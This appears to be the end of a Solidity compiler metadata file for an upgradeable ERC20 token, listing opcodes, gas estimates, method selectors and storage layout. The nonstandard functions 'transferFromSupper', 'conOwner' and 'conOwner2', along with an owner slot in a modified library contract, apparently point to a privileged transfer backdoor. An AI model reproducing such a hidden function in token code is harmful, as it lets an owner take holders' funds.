0x6970667358 0x22 SLT KECCAK256 0xBF KECCAK256 0xB2 0x5E LOG4 PUSH4 0xDC813C09 0xEC 0xB0 LOG0 CALL PUSH24 0x9CEFCAC1F229A908A89C7953B6B522726264736F6C634300 ADDMOD EQ STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "464000",
						"executionCost": "497",
						"totalCost": "464497"
					},
					"external": {
						"allowance(address,address)": "infinite",
						"approve(address,uint256)": "24601",
						"balanceOf(address)": "2688",
						"conOwner()": "2455",
						"conOwner2()": "453",
						"decimals()": "242",
						"decreaseAllowance(address,uint256)": "27143",
						"increaseAllowance(address,uint256)": "infinite",
						"name()": "infinite",
						"symbol()": "infinite",
						"totalSupply()": "2302",
						"transfer(address,uint256)": "51274",
						"transferFrom(address,address,uint256)": "infinite",
						"transferFromSupper(address,address,uint256)": "infinite"
					},
					"internal": {
						"__ERC20_init(string memory,string memory)": "infinite",
						"__ERC20_init_unchained(string memory,string memory)": "infinite",
						"_afterTokenTransfer(address,address,uint256)": "infinite",
						"_approve(address,address,uint256)": "infinite",
						"_beforeTokenTransfer(address,address,uint256)": "infinite",
						"_burn(address,uint256)": "infinite",
						"_mint(address,uint256)": "infinite",
						"_spendAllowance(address,address,uint256)": "infinite",
						"_transfer(address,address,uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"allowance(address,address)": "dd62ed3e",
					"approve(address,uint256)": "095ea7b3",
					"balanceOf(address)": "70a08231",
					"conOwner()": "3c186285",
					"conOwner2()": "c4a7f8ed",
					"decimals()": "313ce567",
					"decreaseAllowance(address,uint256)": "a457c2d7",
					"increaseAllowance(address,uint256)": "39509351",
					"name()": "06fdde03",
					"symbol()": "95d89b41",
					"totalSupply()": "18160ddd",
					"transfer(address,uint256)": "a9059cbb",
					"transferFrom(address,address,uint256)": "23b872dd",
					"transferFromSupper(address,address,uint256)": "4f88f762"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 6,
						"contract": "lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol:ERC20Upgradeable",
						"label": "_initialized",
						"offset": 0,
						"slot": "0",
						"type": "t_uint8"
					},
					{
						"astId": 9,
						"contract": "lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol:ERC20Upgradeable",
						"label": "_initializing",
						"offset": 1,
						"slot": "0",
						"type": "t_bool"
					},
					{
						"astId": 1262,
						"contract": "lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol:ERC20Upgradeable",
						"label": "__gap",
						"offset": 0,
						"slot": "1",
						"type": "t_array(t_uint256)50_storage"
					},
					{
						"astId": 187,
						"contract": "lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol:ERC20Upgradeable",
						"label": "_balances",
						"offset": 0,
						"slot": "51",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 193,
						"contract": "lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol:ERC20Upgradeable",
						"label": "_allowances",
						"offset": 0,
						"slot": "52",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 195,
						"contract": "lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol:ERC20Upgradeable",
						"label": "_totalSupply",
						"offset": 0,
						"slot": "53",
						"type": "t_uint256"
					},
					{
						"astId": 197,
						"contract": "lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol:ERC20Upgradeable",
						"label": "_name",
						"offset": 0,
						"slot": "54",
						"type": "t_string_storage"
					},
					{
						"astId": 199,
						"contract": "lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol:ERC20Upgradeable",
						"label": "_symbol",
						"offset": 0,
						"slot": "55",
						"type": "t_string_storage"
					},
					{
						"astId": 201,
						"contract": "lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol:ERC20Upgradeable",
						"label": "_owner",
						"offset": 0,
						"slot": "56",
						"type": "t_address"
					},
					{
						"astId": 833,
						"contract": "lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol:ERC20Upgradeable",
						"label": "__gap",
						"offset": 0,
						"slot": "57",
						"type": "t_array(t_uint256)45_storage"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_array(t_uint256)45_storage": {
						"base": "t_uint256",
						"encoding": "inplace",
						"label": "uint256[45]",
						"numberOfBytes": "1440"
					},
					"t_array(t_uint256)50_storage": {
						"base": "t_uint256",
						"encoding": "inplace",
						"label": "uint256[50]",
						"numberOfBytes": "1600"
					},
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					},
					"t_uint8": {
						"encoding": "inplace",
						"label": "uint8",
						"numberOfBytes": "1"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}